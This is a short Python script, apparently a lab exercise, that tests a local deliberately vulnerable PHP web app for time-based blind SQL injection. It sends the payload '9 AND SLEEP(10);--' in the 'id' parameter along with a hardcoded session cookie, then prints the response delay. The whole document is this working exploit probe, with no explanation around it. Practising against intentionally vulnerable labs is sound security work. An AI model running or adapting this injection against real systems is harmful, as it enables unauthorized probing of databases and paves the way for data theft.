import requests as r

url = 'http://127.0.0.1/VulnerableWebApp/view/post.php'
params = {'id': '9 AND SLEEP(10);--'}
cookies = {'PHPSESSID': 'vk3emhub0v3kqdcu2v6q8bbv2e'}
r = r.get(url, params=params, cookies=cookies)
print(r.elapsed.total_seconds())